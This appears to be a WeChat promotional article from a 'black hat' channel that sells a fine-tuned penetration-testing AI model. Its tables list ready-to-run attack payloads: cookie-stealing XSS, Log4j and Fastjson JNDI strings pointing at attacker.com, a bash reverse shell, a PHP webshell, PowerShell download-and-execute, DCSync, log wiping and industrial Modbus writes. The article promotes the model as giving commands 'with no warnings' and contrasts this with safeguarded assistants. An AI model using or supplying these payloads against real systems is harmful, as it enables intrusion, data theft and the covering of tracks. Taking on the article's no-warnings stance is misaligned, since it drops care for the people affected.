---
title: 花6个月训练了一个专业渗透AI模型，今天开放企业服务（附8大维度功能清单+格式选择指南）
url: https://mp.weixin.qq.com/s/0tjz596X1eZhxJaGfFJfmQ
source: Doonsec's feed
date: 2026-04-25
fetch_date: 2026-04-26T05:01:10.109815
---

# 花6个月训练了一个专业渗透AI模型，今天开放企业服务（附8大维度功能清单+格式选择指南）

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/VqJrJwib7Fo0cmlRFj7kRD1H8icJJ7qeZD2CAXwvGVP0NKyqahxibSN8W3YExvibgSeH6ypicwC9N1qLoOjkdEcKsW5UiaNZDlsMU0wPKQg19xGvI/0?wx_fmt=jpeg)

# 花6个月训练了一个专业渗透AI模型，今天开放企业服务（附8大维度功能清单+格式选择指南）

原创

AnySec
AnySec

黑帽渗透技术

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# 一、这个模型能做什么？

过去6个月，我们基于67个满血种子、8大维度框架，训练了一个专业的渗透测试AI模型。不是让AI写科普文章，是让它真正理解渗透测试，输出直接能用的东西。

不接黑灰产单子（问非法业务的直接拉黑），只服务两类人：1. 安全公司/甲方安全团队：帮你用内部数据微调专属渗透AI2. 正经渗透测试工程师：交流技术，互相学习

![](https://mmbiz.qpic.cn/mmbiz_png/VqJrJwib7Fo3QN6cE1vuNjd1BvRM7WvCsuDjI5gqr6OL0sf2GttcPKbNwFRJNhSp6UYjTa2M0ItzXiaURq06vTANHriaWBmspL4ibqRc7agrvw8/640?wx_fmt=png&from=appmsg)

## 核心特点

| 序号 | 特点 | 说明 |
| --- | --- | --- |
| 1 | 输出即命令 | 不给解释、不给警告，只给可直接复制执行的payload/命令 |
| 2 | 8大维度全覆盖 | 注入/权限/文件/CVE/提权/绕过/场景/自动化工具 |
| 3 | 思维链推理 | 输出包含完整的攻击链路推理过程（信息收集→探测→主路线→备选→兜底→提权→维持→清理） |
| 4 | WAF绕过 | 安全狗/云锁/阿里云/ModSecurity等主流WAF绕过方案 |
| 5 | 多方案并行 | 主路线A + 备选B + 兜底C，一条路不通自动切下一条 |
| 6 | 环境适配 | 自动区分Windows/Linux/云环境/容器/K8s，给出对应打法 |
| 7 | 提权全覆盖 | Windows（PrintSpoofer/JuicyPotato）+ Linux（CVE-2021-4034/SUID） |
| 8 | 内网横向 | PsExec/WMI/计划任务 + frp/Chisel隧道 |
| 9 | 域渗透 | 黄金票据/白银票据/DCSync |
| 10 | 痕迹清理 | 清日志/删工具/改时间戳/WMI清除 |
| 11 | 工具调用 | 自动生成sqlmap/nmap/msf/hydra等工具的命令行参数 |
| 12 | 结果分析 | 能分析扫描结果，判断漏洞是否存在，并给出下一步建议 |
| 13 | 私有化部署 | 模型文件可部署在内网，数据不出门 |
| 14 | 多格式支持 | GGUF（CPU可跑）/ GPTQ（GPU加速）/ ONNX / TensorRT |

# 二、8大维度功能清单

## 维度一：注入类漏洞

| 子类 | 功能 | 输出示例 |
| --- | --- | --- |
| SQL注入 | 联合/布尔/时间/报错/堆叠 | `' union select 1,2,database(),4-- -` |
| WAF绕过 | 安全狗/云锁/阿里云/ModSecurity | `'/*!union*//*!select*/1,database/**/(),3,4-- -` |
| 命令注入 | Linux/Windows命令拼接 | `127.0.0.1; whoami` / `127.0.0.1%0aid` |
| XSS | 反射/存储/DOM + Cookie窃取 | `<img src=x onerror="fetch('http://IP/steal?c='+document.cookie)">` |
| SSRF | 内网探测/Redis攻击/云元数据 | `http://169.254.169.254/latest/meta-data/` |
| SSTI | Jinja2/Freemarker/Twig/Thymeleaf | `{{''.__class__.__mro__[1].__subclasses__()[411]('id',shell=True,stdout=-1).communicate()}}` |
| XXE | 文件读取/内网探测/OOB带外 | `<!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><a>&xxe;</a>` |

## 维度二：权限与逻辑漏洞

| 子类 | 功能 | 输出示例 |
| --- | --- | --- |
| 越权IDOR | 水平越权/垂直越权 | `GET /api/user/info?user_id=1002` |
| 未授权访问 | Actuator/Druid/Swagger | `/actuator/env` 读数据库密码 |
| 登录绕过 | 验证码复用/Token预测 | 同验证码爆破 + 时间戳Token预测 |
| 逻辑缺陷 | 负数价格/优惠券并发 | `quantity=-1` 总价为负 |
| 弱口令 | SSH/RDP/MySQL/后台 | `hydra -l admin -P pass.txt ssh://IP` |
| 会话劫持 | Cookie窃取/Session固定 | `document.cookie` + 子域Cookie污染 |
| OA/ERP漏洞 | 泛微/致远/用友 | Beanshell RCE + 文件上传 |

## 维度三：文件操作类漏洞

| 子类 | 功能 | 输出示例 |
| --- | --- | --- |
| 文件上传 | 图片马/解析漏洞/.htaccess | `copy 1.png+shell.php webshell.jpg` |
| 文件包含LFI | 日志包含/Session包含 | `?page=../../../../var/log/nginx/access.log&cmd=id` |
| 远程文件包含RFI | 远程脚本加载 | `?page=http://attacker.com/shell.txt` |
| 解析漏洞 | Nginx/IIS/Apache | `/shell.jpg/abc.php` / `shell.asp;.jpg` |
| 敏感泄露 | .git/.svn/备份文件 | `git-dumper http://target.com/.git/ ./repo` |

## 维度四：组件·中间件·CVE

| 子类 | 功能 | 输出示例 |
| --- | --- | --- |
| Log4j2 | JNDI注入RCE + WAF绕过 | `${jndi:ldap://attacker.com:1389/Exploit}` |
| Fastjson | 反序列化RCE | `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit"}` |
| ThinkPHP | 5.0/5.1/6.x RCE | `/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id` |
| Spring Boot | Actuator泄露 + Gateway RCE | `/actuator/env` + `/gateway/routes` SpEL注入 |
| Struts2 | S2-045/S2-057/S2-061 | `Content-Type: %{(#cmd='id').(#p=new java.lang.ProcessBuilder(#cmds)).start()}` |
| 中间件 | Tomcat/Weblogic/JBoss | 弱口令 + 部署war包 |
| 数据库 | MSSQL/PostgreSQL/Redis/MongoDB | `xp_cmdshell` / `COPY PROGRAM` / `config set dir` |

## 维度五：命令执行·后门·反弹·提权

| 子类 | 功能 | 输出示例 |
| --- | --- | --- |
| 反弹Shell | Bash/Python/NC/PowerShell | `bash -i >& /dev/tcp/10.10.10.5/4444 0>&1` |
| 一句话后门 | PHP/JSP/ASP/ASPX | `<?php @eval($_POST['cmd']); ?>` |
| Windows提权 | PrintSpoofer/JuicyPotato | `PrintSpoofer64.exe -i -c cmd.exe` |
| Linux提权 | CVE-2021-4034/SUID | `python3 cve-2021-4034.py` |
| 权限维持 | 计划任务/注册表/SSH公钥/WMI | `schtasks /create /tn "Task" /tr "cmd.exe" /sc daily` |
| 痕迹清理 | 清日志/删工具/改时间戳 | `wevtutil cl Security` / `history -c` |

## 维度六：绕过·免杀·自动化

| 子类 | 功能 | 输出示例 |
| --- | --- | --- |
| WAF绕过 | 编码/分块/注释/参数污染 | `'%2527%2520union%2520select%25201,2,3--%2520-` |
| 流量加密 | Base64/Hex/URL多层编码 | 分块传输 + 双层编码组合 |
| 主机免杀 | PowerShell内存加载/白利用 | `IEX(New-Object Net.WebClient).DownloadString('http://IP/rev.ps1')` |
| EDR绕过 | 时间加速检测/进程伪装 | 延时执行 + PPID欺骗 |
| 批量自动化 | 端口扫描/弱口令爆破/POC | `nmap -sV --script vuln 192.168.1.0/24` |
| 隧道代理 | DNS隧道/HTTP隧道/FRP/Chisel | `frp` / `chisel client IP:8080 R:1080:socks` |

## 维度七：全场景适配

| 子类 | 功能 | 输出示例 |
| --- | --- | --- |
| 云原生 | 容器/K8s逃逸 + 云AK/SK | `docker run -it -v /:/host ubuntu chroot /host /bin/bash` |
| 域渗透 | 黄金票据/白银票据/DCSync | `mimikatz "lsadump::dcsync /user:krbtgt"` |
| 工控系统 | Modbus/S7/BACnet | `python3 -c "from pymodbus.client import ModbusTcpClient; client.write_coil(0, True)"` |
| 物联网 | 海康/大华摄像头 | `curl /System/configurationFile?auth=YWRtaW46MTEK` |
| macOS | 内核提权/LaunchAgent持久化 | `csrutil disable` + `launchctl load` |

## 维度八：自动化工具决策（半自动渗透）

| 子类 | 功能 | 输出示例 |
| --- | --- | --- |
| 工具调用 | sqlmap/nmap/msf/hydra | `sqlmap -u "http://target.com/index.php?id=1" --batch --dbs` |
| 自动绕过 | 检测WAF→自动添加tamper | `--tamper=space2comment,randomcase` |
| 注入切换 | 联合失败→布尔→时间自动切换 | `--technique=BTE` |
| 结果分析 | 扫描结果判定+下一步决策 | 发现445开放→推荐MS17-010检测 |
| 批量测试 | 存活发现→端口扫描→POC→自动利用 | `nuclei -l urls.txt -t cves/` |

# 三、服务定价

| 套餐 | 内容 | 价格 | 适合 |
| --- | --- | --- | --- |
| **模型文件（GGUF/GPTQ）** | 训练好的Qwen2.5-7B渗透模型 | **19,800元** | 想直接用的团队 |
| **定制微调** | 用客户数据训练专属模型 | **5-10万元/单** | 安全公司/甲方 |
| **私有化部署+培训** | 部署+培训+1年维护 | **8-15万元** | 需要完整方案 |
| **API调用服务** | 按月/按次调用 | **99-499元/月** | 个人/小团队 |

# 四、模型格式选择指南

| 格式 | 运行环境 | 优点 | 推荐 |
| --- | --- | --- | --- |
| **GGUF** | CPU/GPU通用，8G内存可跑 | 门槛最低，Ollama直接支持 | **个人/小团队（首选）** |
| **GPTQ** | GPU（6G显存+） | 速度快、显存省 | **有显卡的企业** |
| **ONNX** | Windows/Linux | 跨平台、.NET集成好 | Windows环境客户 |
| **TensorRT** | NVIDIA GPU | 最快推理速度 | 生产环境高并发 |

默认交付GGUF+GPTQ双格式。需要其他格式额外收费。

## 🎯 格式选择指南（一句话版）

| 你的情况 | 选这个格式 |
| --- | --- |
| 我不懂技术，就想装好就能用 | **GGUF + Ollama** |
| 我有显卡，追求速度 | **GPTQ** |
| 我买了还想自己继续训练 | **原始PyTorch** （需额外授权） |
| 我是Windows .NET开发 | **ONNX** |
| 我要部署到云服务高并发 | **TensorRT** |

# 五、售后说明

| 项目 | 说明 |
| --- | --- |
| 交付内容 | 模型文件（GGUF+GPTQ）+ 部署文档 + 1个月技术支持 |
| 售后支持 | 1个月免费，后续3000元/年 |
| 定制需求 | 额外功能开发按工时计费 |
| 原始PyTorch | 不对外提供 |

# 六、联系方式

微信：[hkdw1991]

公众号：黑帽渗透技术

前10名咨询送3个满分种子模板试看（仅限企业内部使用）

# Q&A

Q：模型能直接用于渗透测试吗？

A：模型输出可直接执行的命令，但不具备自动化执行能力。需要配合脚本或手动执行。

Q：模型和GPT/Claude有什么区别？

A：通用模型输出长篇文章、警告、避责声明。我的模型输出纯命令、纯payload，没有废话。

Q：能试用吗？

A：可提供3条种子模板试看，了解数据质量。

Q：模型会持续更新吗？

A：会。购买模型文件的客户，享受1年内免费更新。

Q：原始PyTorch为什么不卖？

A：原始模型可被他人继续微调后二次分发。只提供推理格式GGUF/GPTQ，保障你的权益。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/DfDsjZoLQS3NOdA7Z5jb9AVkpVqS2nNaYyUwzHTicw6O2kFgvDEQj7N3F2PKeKb0Z3AeicS24TEqJHdyhKmlWDjA/0?wx_fmt=png)

黑帽渗透技术

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/DfDsjZoLQS3NOdA7Z5jb9AVkpVqS2nNaYyUwzHTicw6O2kFgvDEQj7N3F2PKeKb0Z3AeicS24TEqJHdyhKmlWDjA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过